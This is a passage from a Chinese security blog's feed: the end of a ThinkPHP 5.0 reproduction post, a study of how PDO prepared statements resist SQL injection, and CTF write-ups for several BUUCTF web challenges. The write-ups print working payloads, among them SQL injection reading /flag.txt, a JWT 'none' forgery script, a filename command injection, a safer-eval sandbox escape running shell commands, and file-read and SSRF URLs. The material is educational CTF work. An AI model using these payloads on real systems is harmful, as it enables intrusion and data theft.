src="G:%5CMyBlog%5Csource%5Cimages%5CTP5.0.24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86%5Cimage-20201005193636907.png" alt="image-20201005193636907"></p><p>在exp后加了一个空格，导致case判断失败。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TP5-0-漏洞复现&quot;&gt;&lt;a href=&quot;#TP5-0-漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;TP5.0.*漏洞复现&quot;&gt;&lt;/a&gt;TP5.0.*漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;header</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://yoursite.com/categories/漏洞复现/"/>
    
    
  </entry>
  
  <entry>
    <title>pdo学习</title>
    <link href="http://yoursite.com/2019/10/02/PDO%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/10/02/PDO%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-10-01T16:00:00.000Z</published>
    <updated>2020-10-06T07:14:32.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PDO预处理学习"><a href="#PDO预处理学习" class="headerlink" title="PDO预处理学习"></a>PDO预处理学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在代码审计的时候，经常会碰到与pdo有关的sql注入，通过看各种文章，感觉还是弄不懂预处理是如何预防sql注入的，于是就通过抓取流量包的形式，更加深入的了解pdo预处理。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用WireShark，选择Adapter for loopback traffic capture网卡即可抓取本地流量包。</p><h2 id="深入学习"><a href="#深入学习" class="headerlink" title="深入学习"></a>深入学习</h2><p>由于并不是所有的数据库驱动都支持预编译模式，所以PDO有模拟预处理功能，就是PDO内部会模逆参数绑定的过程，最后在execute时发送完整的sql语句给数据库执行，PDO的模逆预处理功能是默认打开的，可以通过设置<code>ATTR_EMULATE_PREPARES=false</code>来关闭模逆。</p><p>直接上代码演示两种模式</p><h3 id="本地预处理"><a href="#本地预处理" class="headerlink" title="本地预处理"></a>本地预处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo=<span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=pdotest"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,<span class="keyword">false</span>)</span><br><span class="line">$user=<span class="string">"lili"</span>;</span><br><span class="line">$sql=<span class="string">"select * from user where username=?"</span>;</span><br><span class="line">$st=$pdo-&gt;prepare($sql);</span><br><span class="line">$st-&gt;bindParam(<span class="number">1</span>,$user);</span><br><span class="line">$st-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>抓取流量包</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005214411675.png" alt="image-20201005214411675"></p><p>发现在prepare时，会发送一个带有占位符的mysql预处理语句，在execute时，将绑定的参数发送给数据库。</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005214731021.png" alt="image-20201005214731021"></p><p>尝试一下sql注入</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006134328847.png" alt="image-20201006134328847"></p><p>发送数据时未经过任何处理，但是得不到返回结果，查看mysql查询日志。</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006134416919.png" alt="image-20201006134416919"></p><p>看来在mysql本地的预处理，也会将数据转义，那么尝试一下宽字节注入，发现无法得到结果，查看日志</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006141225775.png" alt="image-20201006141225775"></p><p>看来当编码设置为GBK时，mysql会将字符串转换成16进制，所以无法注入。</p><p>当使用本地预处理时，能使用报错注入，而且只需要执行到prepare就能够将用户名，版本这些信息爆出来，前提是能够控制参数内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pdo=new PDO(&quot;mysql:host=localhost;dbname=pdotest&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">$user=&quot;lili&quot;;</span><br><span class="line">$pdo-&gt;setAttribute(pdo::ATTR_EMULATE_PREPARES, false);</span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,user()),0))&quot;;</span><br><span class="line">$st=$pdo-&gt;prepare($sql);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>尝试爆出数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from user where username=(updatexml(0,concat(0xa,(select * from user limit 1)),0))&quot;;</span><br></pre></td></tr></table></figure><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201006145729946.png" alt="image-20201006145729946"></p><p>这里非常奇怪，因为需要执行到execute才会在流量包中返回错误，但是PDO并不会报错，去网上搜都说PDO不支持子查询，但我这里确实返回了报错，不解。</p><h3 id="模拟预处理"><a href="#模拟预处理" class="headerlink" title="模拟预处理"></a>模拟预处理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo=<span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=pdotest"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">$user=<span class="string">"1' or 1=1 #"</span>;</span><br><span class="line">$sql=<span class="string">"select * from user where username=?"</span>;</span><br><span class="line">$st=$pdo-&gt;prepare($sql);</span><br><span class="line">$st-&gt;bindParam(<span class="number">1</span>,$user);</span><br><span class="line">$st-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>抓取流量包</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005211830170.png" alt="image-20201005211830170"></p><p>发现字符串被转义了，这是因为使用bindParam时，会进行字符串转义操作，同<code>mysql_real_escape_string</code>。</p><p>既然是转义，感觉也能进行宽字节注入。</p><p>首先需要设置一下编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(<span class="string">'SET NAMES GBK'</span>);</span><br></pre></td></tr></table></figure><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CPDO%E5%AD%A6%E4%B9%A0%5Cimage-20201005213001535.png" alt="image-20201005213001535"></p><p>抓包发现成功返回结果，宽字节注入成功。</p><p>pdo的mysql语句多行执行也是默认打开的，所以在可以控制参数前提下，能够使用多行来进行注入。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总之，只要使用参数绑定，并设置本地预处理优先，基本上就完美防御了sql注入。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PDO预处理学习&quot;&gt;&lt;a href=&quot;#PDO预处理学习&quot; class=&quot;headerlink&quot; title=&quot;PDO预处理学习&quot;&gt;&lt;/a&gt;PDO预处理学习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="pdo" scheme="http://yoursite.com/categories/pdo/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF1</title>
    <link href="http://yoursite.com/2019/10/02/BUUCTF2/"/>
    <id>http://yoursite.com/2019/10/02/BUUCTF2/</id>
    <published>2019-10-01T16:00:00.000Z</published>
    <updated>2020-10-10T12:11:38.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>打开题目，查看界面源码发现提示?file，于是将源码读取，发现address处没有过滤，在change.php中发现二次注入点<img src="https://i.loli.net/2020/10/02/Nt4MJyQTmqIBuzb.png" alt></p><p>随便注入以下，发现报错，果然就是报错注入了，数据库逛了一圈，啥也没有，发现题目把load_fileBAN了，就试试直接读flag，因为是ciscn的题目，所以flag都在/flag.txt，由于报错长度限制，分两次爆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),1,25)),0x3a),1)#</span><br><span class="line">&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),25,50)),0x3a),1)#</span><br></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>题目给出源码，看了一下，guess是不可能猜中，也不可能绕过的，所以点肯定在<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code>这里。</p><p>basename函数当路径以/结尾时，会返回/前面的内容，当文件名只含有一个非ascii码字符时，basename会将它忽略，所以可以用<code>/index.php/config.php/%ff?source</code>读取flag。</p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>打开看发现是koa框架，网上查一查，koa通常会在controllers目录中存放处理逻辑js代码，通常是放在api.js/user.js中，访问controllser/api.js得到逻辑代码，发现是一道JWT伪造。</p><p>当username=admin时，可以访问/flag。</p><p>JWT自身加密的问题，我们可以用alg=’none’绕过，只需要绕过下面这一段代码就行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里时一个JS的弱类型问题，以下代码是成立的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a =[]</span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只需要构造secretid=[]即可绕过判断。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'type'</span>:<span class="string">'jwt'</span>,</span><br><span class="line"><span class="string">'alg'</span>:<span class="string">"none"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'iat'</span>:<span class="number">1587378820</span>,</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'123'</span>,</span><br><span class="line"><span class="string">'secretid'</span>:[]</span><br><span class="line">&#125;</span><br><span class="line">he=json.dumps(headers)</span><br><span class="line">pa=json.dumps(payload)</span><br><span class="line">a=base64.b64encode(he.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">b=base64.b64encode(pa.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a+<span class="string">'.'</span>+b)</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>答开题目，抓包发现提示home.php，进入发现直接跳到了system.php，F12再network处查看网络请求，发现了home.php?file=system请求，试试伪协议读源码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=home</span><br></pre></td></tr></table></figure><p>将home和system的代码都读取出来，再home.php中发现存在admin.php，但是要本地访问，flag也被限制的死死的，于是只能在system.php找找。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求q2必须要以<code>http://127.0.0.1</code>开头，那估计就是用file_get_contents打开admin.php了，发现$url在q2后拼接了字符串，这个可以在q2后加#锚点符或者参数<code>?a=</code>这种形式绕过，最后发现它使用%d来打印返回内容，这肯定要把它改成%s才行。</p><p>在<a href="https://www.php.net/manual/zh/function.sprintf.php" target="_blank" rel="noopener">官网</a>搜到，sprintf能够指定参数位置<code>%[argnum$][flags][width][.precision]</code></p><p>所以可以指定使用<code>%1$s</code>能够将$detect转变为字符串输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=flag&amp;q2=http://127.0.0.1/admin.php?a=%1$s&amp;q3=get</span><br></pre></td></tr></table></figure><p>同时在官网可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notice the double %%, this prints a literal &apos;%&apos; character</span><br></pre></td></tr></table></figure><p>两个%%符号会输出真正的%，所以也能利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=flag&amp;q2=http://127.0.0.1/admin.php?a=&amp;q3=get%s%</span><br></pre></td></tr></table></figure><p>成功获得admin.php代码</p><p>admin.php的逻辑非常的脆弱，AES-128-CBC的加密数据是存放在session中的，如果不带sessionid访问，加密数据就是空，我们可以构造出加密空数据后的$cipher</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &apos;AES-128-CBC&apos;;</span><br><span class="line">    $iv = md5(&quot;174.0.0.15&quot;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">echo aesEn(&apos;&apos;,&apos;y1ng&apos;);</span><br></pre></td></tr></table></figure><p>将上面的输出传给decrypt，即可得到flag。</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>简单判断一下，是一道数字型盲注，过滤了or、union等字符，首先将数据库版本弄到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((version()),1,1))&gt;52,1,0)</span><br></pre></td></tr></table></figure><p>版本是5.7.29，在此版本中，sys增加了可以查看表名的视图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()</span><br></pre></td></tr></table></figure><p>得到表名<code>f1ag_1s_h3r3_hhhhh</code>,由于过滤了union，只能使用<a href="https://dev.mysql.com/doc/refman/8.0/en/row-subqueries.html" target="_blank" rel="noopener">Row Subqueries</a>，在mysql中，字符串的比较是按照字典序来比的即<code>&#39;g&#39;&gt;&#39;fzz&#39;</code>，所以以下表达式成立</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure><p>可以按照这样的思路去爆破，不过爆破出来的结果需要减去1。</p><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>注册一个账号登录进去发现可以用伪协议读源码，发现使用parseurl提取处数据过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</span><br><span class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</span><br><span class="line">parse_str($uri[&apos;query&apos;], $query);</span><br></pre></td></tr></table></figure><p>parse_url在碰到格式错误的url时，会返回False,所以我们构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port//user.php?page=php://filter/convert.base64-encode/resource=m4aaannngggeee</span><br></pre></td></tr></table></figure><p>就可以绕过过滤，直接包含文件，发现一个templates/upload.html，访问一下，是一个文件上传的点，发现了一个文件<code>upllloadddd.php</code>，上传文件发现这个文件好像并不在当前目录下，使用伪协议读取源码，发现upload在templates的前一级目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=upllloadddd</span><br></pre></td></tr></table></figure><p>所以我们只能使用文件包含m4aaannngggeee来上传文件，通过读取源码发现，filename并不存在过滤，所以直接使用filename进行命令执行（PS:文件路径会在/处截断），所以我们不能使用/。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;glag;cd ..;ls;cat flag_233333 ;#&quot;</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>抓包看见了IP地址，XFF可以伪造，会输出当前IP地址与上次的IP地址，当当前IP地址不变时，上次的IP也不会变，感觉应该是储存型SQL注入，后台逻辑应该是前两次输入时，存入数据库，按照输入顺序输出输入变量，当两次输入后，就从数据库读取IP数据，这就造成了注入。</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201006220822431.png" alt="image-20201006220822431"></p><p>将Payload存入Current Ip</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201006220846345.png" alt="image-20201006220846345"></p><p>再次输入变成Last Ip</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201006220918336.png" alt="image-20201006220918336"></p><p>再次输入同样的值，就触发了储存型sql注入，而且没有WAF。</p><p>这题的flag存在别的数据库中，所以我们先要爆破一下数据库，然后再一套流程下来，拿到flag。</p><p>在最后查flag时，由于是跨库操作，需要指定数据库名，不然会找不到表<code>数据库名.表名</code>。</p><h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p>查看源码，发现使用了safer-eval库，版本是1.3.6，safer-eval通过vm模块做沙箱环境执行代码，隔离代码的上下文环境，也就是说沙箱内部无法访问外部非global变量，但是外部可以访问到沙箱内部变量。</p><p>刚说到可以使用全局变量，我们就可以通过process全局对象的mainModule属性来获取当前Module，然后加载child_process子进程模块，该模块中有许多命令执行的方法比如execSync。</p><p>safer-eval对会对vm沙箱中的变量值进行过滤，如果碰到global变量就将它赋值为undefined，process显然在其中，那怎么办呢，变量中不能直接有process，我们还可以使用构造函数Function(“return process”);这样也能返回process的值，但是Function也在黑名单中，通过观察safer-eval的源码，我们可以发现safer-eval在沙箱的上下文中添加了6个可使用函数</p><p><img src="G:%5CMyBlog%5Csource%5Cimages%5CBUUCTF2%5Cimage-20201007204404024.png" alt="image-20201007204404024"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;clearImmediate&apos;,&apos;clearInterval&apos;,&apos;clearTimeout&apos;,&apos;setImmediate&apos;,&apos;setInterval&apos;,&apos;setTimeout&apos;</span><br></pre></td></tr></table></figure><p>所以我们可以使用<code>clearImmediate.constructor</code>来获得Function。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const a=clearImmediate.constructor(&quot;return process;&quot;)();</span><br></pre></td></tr></table></figure><p>构造函数并执行返回process。</p><p>但是即使一个函数都没有，也可以这样构造(PS:可以自己去试试)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const a=&apos;&apos;.constructor.constructor(&quot;return process;&quot;)();</span><br></pre></td></tr></table></figure><p>既然有了process，那一切都好办了</p><p>通过process.mainModule获得当前模块<a href="http://nodejs.cn/api/modules.html#modules_module_require_id" target="_blank" rel="noopener">可以用当前模块调用require</a>，引入child_process模块，在child_process模块中有许多命令执行的函数能够使用，最后，由于题目显示的是返回值，所以我们需要以函数返回的形式返回命令执行结果。最终的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;const a=clearImmediate.constructor(&quot;return process;&quot;)(); return a.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;)()</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><p>一道SSRF，将内网地址都过滤了，在此处有三种方式绕过。</p><ul><li>利用Curl与Parseurl解析的不同绕过，在我的另一篇SSRF学习中有提到。</li><li>利用DNS重绑定漏洞，同上。</li><li>0.0.0.0未被过滤，0.0.0.0的IP地址表示整个网络</li></ul><p>但是在BUU上，只能使用第三种方式绕过(无法访问外网)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:/?url=http://0.0.0.0/hint.php</span><br></pre></td></tr></table></figure><p>得到Redis密码。</p><p>那就直接用gopher写WebShell咯，具体也在我的SSRF文章中有写到，当然在BUU上可以开一个linux靶机，主从复制也是可以的。</p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>使用json_decode获取数据，查看官方手册。</p><p><img src="G:%5CMyBlog%5Csource_posts%5Cimage%5CBUUCTF2%5Cimage-20201010155236979.png" alt="image-20201010155236979"></p><p>支持UTF-8编码，那就是支持unicode，直接unicode编码绕过WAF，使用php伪协议读取flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u0070\u0061\u0067\u0065&quot;:&quot;\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>源码发现一段base32加密的字符，解密进入1nD3x.php。</p><p>第一关：绕过$_SERVER[‘QUERY_STRING’]</p><p>由于$_SERVER[‘QUERY_STRING’]不会urldecode，所以将上传的参数urlencode一次即可绕过。</p><p>第二关：绕过$正则匹配</p><p>$在单行查询下不会进行匹配换行符，%0a换号符绕过。</p><p>第三关：绕过$_REQUEST</p><p>翻阅<a href="https://www.php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="noopener">PHP手册</a>，发现$_REQUEST数组获得值得顺序按照php.ini中的<a href="https://www.php.net/manual/zh/ini.core.php#ini.variables-order" target="_blank" rel="noopener">variables_order</a>配置。</p><p>在默认情况下variables_order得值是 EGPCS (<code>Environment</code>, <code>Get</code>, <code>Post</code>, <code>Cookie</code>, and <code>Server</code>)，首先获得GET中的值，然后再获取POST中得值，这里就导致了变量覆盖，所以用POST方法上传参数将GET的参数覆盖即可绕过。 </p><p>第四关：绕过file_get_contents($file)</p><p>使用data协议</p><p>第五关：md5绝对比较</p><p>使用数组绕过。</p><p>第六关：命令执行<code>$code(&#39;&#39;, $arg);</code>形式</p><p>关键点在于：</p><ul><li><p>使用create_function绕过，由于create_function基于eval实现，可以进行拼接绕过</p></li><li><p>PHP 自动将裸字符串（没有引号的字符串且不对应于任何已知符号）转换成一个其值为该裸字符串的正常字符串。</p></li><li><p>fopen,fget未被过滤</p></li><li><p>define函数可以定义常量，get_defined_vars()</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;define(a,fopen(base64_decode(cmVhMWZsNGcucGhw),r));while(!feof(a))var_dump(fgets(a));fclose(a);//</span><br></pre></td></tr></table></figure><p>urlencode即可得到flag。</p>]]></content>
    
    
      
      
